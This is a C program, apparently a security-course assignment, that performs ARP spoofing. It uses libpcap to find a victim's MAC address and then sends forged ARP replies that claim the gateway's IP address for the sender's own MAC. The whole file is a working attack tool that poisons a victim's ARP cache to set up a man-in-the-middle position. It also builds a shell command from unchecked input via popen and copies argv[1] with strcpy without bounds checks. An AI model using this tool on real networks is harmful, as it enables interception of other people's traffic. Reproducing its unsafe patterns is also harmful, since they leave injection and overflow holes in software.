#include <sys/time.h>
#include <netinet/in.h>
#include <net/ethernet.h>
#include <pcap/pcap.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <libnet.h>
#include <pthread.h>

#define PROMISCOUS 1
#define NONPROMISCUOUS 0

#define IPSTR_MAX 16
#define MACSTR_MAX 18

char victim_mac_addr_str[MACSTR_MAX];
char victim_ip_addr_str[IPSTR_MAX];
char gateway_ip[IPSTR_MAX];
char my_ip[IPSTR_MAX];
char my_mac[MACSTR_MAX];

// http://stackoverflow.com/questions/3288065/getting-gateway-to-use-for-a-given-ip-in-ansi-c
void GetGatewayForInterface(const char *interface, char *gateway_ip)
{
    char cmd [1000] = {0x0};
    sprintf(cmd,"route -n | grep %s  | grep 'UG[ \t]' | awk '{print $2}'", interface);
    FILE* fp = popen(cmd, "r");

    fgets(gateway_ip, 256, fp);

    pclose(fp);
}

void packetfilter_callback(u_char *useless, const struct pcap_pkthdr *pkthdr, const u_char *packet) {
    struct libnet_ethernet_hdr *eth_header;     // struct ethhdr 도 가능
    struct libnet_arp_hdr *arp_header;          // struct arphdr도 가능
    unsigned short etherh_protocoltype;
    int length = pkthdr->len;

    char arp_sender_ip[IPSTR_MAX], arp_target_ip[IPSTR_MAX];
    char arp_sender_mac[MACSTR_MAX], arp_target_mac[MACSTR_MAX];

    // get ethernet header
    eth_header = (struct libnet_ethernet_hdr *)packet;
    // get get ethernet header -> protocol type
    etherh_protocoltype = ntohs(eth_header->ether_type);

    printf("\n\n[Ethernet Packet info]\n");
    printf("   [*] Source MAC address : %s\n", ether_ntoa((const ether_addr *)eth_header->ether_shost));
    printf("   [*] Destination MAC address : %s\n", ether_ntoa((const ether_addr *)eth_header->ether_dhost));

    if(etherh_protocoltype == ETHERTYPE_ARP) {
        // move to offset
        packet += sizeof(struct libnet_ethernet_hdr);
        // get ip header
        arp_header = (struct libnet_arp_hdr *)packet;

        if(ntohs(arp_header->ar_op) == 2) {
            // move to offset
            packet += sizeof(struct libnet_arp_hdr);
            inet_ntop(AF_INET, (struct in_addr *)(packet+6), arp_sender_ip, sizeof(arp_sender_ip));
            inet_ntop(AF_INET, (struct in_addr *)(packet+16), arp_target_ip, sizeof(arp_target_ip));
            sprintf(arp_sender_mac, "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x", *(packet), *(packet+1), *(packet+2), *(packet+3), *(packet+4), *(packet+5));
            sprintf(arp_target_mac, "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x", *(packet+10), *(packet+11), *(packet+12), *(packet+13), *(packet+14), *(packet+15));
            printf("[ARP Packet info]\n");
            printf("   [*] Sender Hardware Address : %s\n", arp_sender_mac);
            printf("   [*] Sender Protocol Address : %s\n", arp_sender_ip);
            printf("   [*] Target Hardware Address : %s\n", arp_target_mac);
            printf("   [*] Target Protocol Address : %s\n", arp_target_ip);
            if(!strcmp(arp_sender_ip, victim_ip_addr_str)) {
                strncpy(victim_mac_addr_str, arp_sender_mac, MACSTR_MAX);
                pthread_exit(NULL);
            }
        }
    }
    printf("\n");
}

void *get_victim_mac_pcap_thread(void *useless) {
    char *dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    bpf_u_int32 netp;
    bpf_u_int32 maskp;
    pcap_t *pcd;    // packet capture descriptor
    struct bpf_program fp;

    dev = pcap_lookupdev(errbuf);       // dev = "ens33"으로 해도 무방
    if(dev == NULL) {
        printf("%s\n", errbuf);
        exit(1);
    }
    printf("DEV: %s\n", dev);

    // get net, mask info
    int ret = pcap_lookupnet(dev, &netp, &maskp, errbuf);
    if(ret == -1) {
        printf("%s\n", errbuf);
        exit(1);
    }

    pcd = pcap_open_live(dev, BUFSIZ, NONPROMISCUOUS, -1, errbuf);
    if(pcd == NULL) {
        printf("%s\n", errbuf);
        exit(1);
    }

    // filter option compile
    if(pcap_compile(pcd, &fp, "", 0, netp) == -1) {      //if(pcap_compile(pcd, &fp, "argv[2]", 0, netp) == -1) {
        printf("compile error\n");
        exit(1);
    }

    // filter option setting
    if(pcap_setfilter(pcd, &fp) == -1) {
        printf("setfilter error\n");
        exit(0);
    }

    // int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user)
    // param2(int cnt) : 패킷 캡쳐 몇번(0이면 infinite)
    // param3 : filtered packet이 들어오면 실행되는 handler callback func
    pcap_loop(pcd, 0, packetfilter_callback, NULL);     //pcap_loop(pcd, atoi(argv[1]), packetfilter_callback, NULL);

    return 0;
}

void build_arp_packet(u_char* arp_packet, int operation) {
    unsigned char victim_mac_addr[6];
    unsigned char my_mac_addr[6];

    printf("mymac : %s\n", my_mac);
    sscanf(my_mac, "%2x:%2x:%2x:%2x:%2x:%2x", my_mac_addr, my_mac_addr+1, my_mac_addr+2, my_mac_addr+3, my_mac_addr+4, my_mac_addr+5);

    // ARP Request Packet
    if(operation == 1) {
        arp_packet[20]='\x00'; arp_packet[21]='\x01';   // Opcode : 0x0001(request)

        // ehternet header : destination MAC address
        arp_packet[0] = '\xff'; arp_packet[1] = '\xff'; arp_packet[2] = '\xff';
        arp_packet[3] = '\xff'; arp_packet[4] = '\xff'; arp_packet[5] = '\xff';

        // arp header : sender mac address(my mac)
        for(int i=0; i<6; i++)
            arp_packet[i+22]=my_mac_addr[i];

        // arp header : sender ip address(my ip)
        unsigned char ip_byte_arr[4];
        sscanf(my_ip, "%d.%d.%d.%d", ip_byte_arr, ip_byte_arr+1, ip_byte_arr+2, ip_byte_arr+3);
        arp_packet[28]=ip_byte_arr[0]; arp_packet[29]=ip_byte_arr[1];
        arp_packet[30]=ip_byte_arr[2]; arp_packet[31]=ip_byte_arr[3];

        // arp header : target mac address(00:00:00:00:00:00)
        arp_packet[32] = '\x00'; arp_packet[33] = '\x00'; arp_packet[34] = '\x00';
        arp_packet[35] = '\x00'; arp_packet[36] = '\x00'; arp_packet[37] = '\x00';

        // arp header : target ip address(victim ip)
        sscanf(victim_ip_addr_str, "%d.%d.%d.%d", ip_byte_arr, ip_byte_arr+1, ip_byte_arr+2, ip_byte_arr+3);
        arp_packet[38]=ip_byte_arr[0]; arp_packet[39]=ip_byte_arr[1];
        arp_packet[40]=ip_byte_arr[2]; arp_packet[41]=ip_byte_arr[3];
    }
    // ARP Reply Packet
    else if(operation == 2) {
        printf("test~!\n");
        arp_packet[20]='\x00'; arp_packet[21]='\x02';   // Opcode : 0x0002(reply)

        sscanf(victim_mac_addr_str, "%2x:%2x:%2x:%2x:%2x:%2x", victim_mac_addr, victim_mac_addr+1, victim_mac_addr+2, victim_mac_addr+3, victim_mac_addr+4, victim_mac_addr+5);
        // ethernet header : destination MAC address
        for(int i=0; i<6; i++)
            arp_packet[i] = victim_mac_addr[i];

        // arp header : sender mac address(my mac)
        for(int i=0; i<6; i++)
            arp_packet[i+22]=my_mac_addr[i];

        // arp header : sender ip address(gateway ip)
        unsigned char ip_byte_arr[4];
        sscanf(gateway_ip, "%d.%d.%d.%d", ip_byte_arr, ip_byte_arr+1, ip_byte_arr+2, ip_byte_arr+3);
        arp_packet[28]=ip_byte_arr[0]; arp_packet[29]=ip_byte_arr[1];
        arp_packet[30]=ip_byte_arr[2]; arp_packet[31]=ip_byte_arr[3];

        // arp header : target mac address(victim mac)
        for(int i=0; i<6; i++)
            arp_packet[i+32] = victim_mac_addr[i];

        // arp header : target ip address(victim ip)
        sscanf(victim_ip_addr_str, "%d.%d.%d.%d", ip_byte_arr, ip_byte_arr+1, ip_byte_arr+2, ip_byte_arr+3);
        arp_packet[38]=ip_byte_arr[0]; arp_packet[39]=ip_byte_arr[1];
        arp_packet[40]=ip_byte_arr[2]; arp_packet[41]=ip_byte_arr[3];
    }

    // ethernet header : source MAC address(my mac)
    for(int i=0; i<6; i++)
        arp_packet[i+6]=my_mac_addr[i];

    // ethernet header : protocol type
    arp_packet[12]='\x08'; arp_packet[13]='\x06';

    // arp header
    arp_packet[14]='\x00'; arp_packet[15]='\x01';   // Hardware type : 0x0001
    arp_packet[16]='\x08'; arp_packet[17]='\x00';   // Protocol type : 0x0800(ipv4)
    arp_packet[18]='\x06'; arp_packet[19]='\x04';   // Hardware size : 0x06, Protocol size : 0x04

    for(int i=0; i<8; i++) {
        for(int j=0; j<6; j++) {
            printf("%.2x ", arp_packet[i*6+j]);
        }
        printf("\n");
    }
}

int main(int argc, char **argv) {
    char track[] = "취약점"; char name[] = "이우진";
    char *dev;
    int ret;
    char errbuf[PCAP_ERRBUF_SIZE];
    bpf_u_int32 netp;
    bpf_u_int32 maskp;

    pcap_t *pcd;    // packet capture descriptor
    strcpy(victim_ip_addr_str, argv[1]);

    printf("=====================================\n");
    printf("[bob5][%s]send_arp[%s]\n\n", track, name);
    // get network dev name("ens33")
    dev = pcap_lookupdev(errbuf);       // dev = "ens33"으로 해도 무방
    if(dev == NULL) {
        printf("%s\n", errbuf);
        exit(1);
    }
    printf("DEV: %s\n", dev);

    // get net, mask info
    ret = pcap_lookupnet(dev, &netp, &maskp, errbuf);
    if(ret == -1) {
        printf("%s\n", errbuf);
        exit(1);
    }

    // dev 에 대한 packet capture descriptor를 pcd에 저장.
    // param1 : dev, param2 : snaplen(받아들일 수 있는 패킷의 최대 크기(byte),
    // param3 : promiscuous mode(1), non promisc(0), param4 : to_ms(time out)
    // param5 : error이면 NULL리턴 하고 ebuf에 에러 저장
    pcd = pcap_open_live(dev, BUFSIZ, NONPROMISCUOUS, -1, errbuf);
    if(pcd == NULL) {
        printf("%s\n", errbuf);
        exit(1);
    }


    // /////////////////////////////////////////////////////////////////////////////////////////////////
    // Get Information(My IP Address, My MAC Address, Default Gateway IP Address, Victim MAC Address)
    struct ifreq ifr;
    u_char arp_packet[42];

    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    snprintf(ifr.ifr_name, IFNAMSIZ, dev);
    ioctl(fd, SIOCGIFADDR, &ifr);
    // my ip addr 저장
    inet_ntop(AF_INET, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr, my_ip, sizeof(my_ip));
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    sprintf(my_mac, "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x", (unsigned char)ifr.ifr_hwaddr.sa_data[0], (unsigned char)ifr.ifr_hwaddr.sa_data[1], (unsigned char)ifr.ifr_hwaddr.sa_data[2], (unsigned char)ifr.ifr_hwaddr.sa_data[3], (unsigned char)ifr.ifr_hwaddr.sa_data[4], (unsigned char)ifr.ifr_hwaddr.sa_data[5]);
    /* and more importantly */
    printf("My IP addr : %s\n", my_ip);
    printf("My MAC addr : %s\n", my_mac);
    close(fd);

    GetGatewayForInterface(dev, gateway_ip);
    printf("GateWay IP addr : %s\n", gateway_ip);
    printf("=====================================\n");

    // /////////////////////////////////////////////////////////////////////////////////////////////////

    build_arp_packet(arp_packet, 1);

    pthread_t thread_id;
    pthread_create(&thread_id, NULL, get_victim_mac_pcap_thread, &pcd);
    sleep(3);
    for(int i=0; i<3; i++) {
        /* Send down the packet */
        if (pcap_sendpacket(pcd, arp_packet, 42 /* size */) != 0)
        {
            fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(pcd));
            return 0;
        }
    }
    pthread_join(thread_id, NULL);

    // arp reply attack
    build_arp_packet(arp_packet, 2);
    for(int i=0; i<3; i++) {
        /* Send down the packet */
        if (pcap_sendpacket(pcd, arp_packet, 42 /* size */) != 0)
        {
            fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(pcd));
            return 0;
        }
    }

    return 0;
}
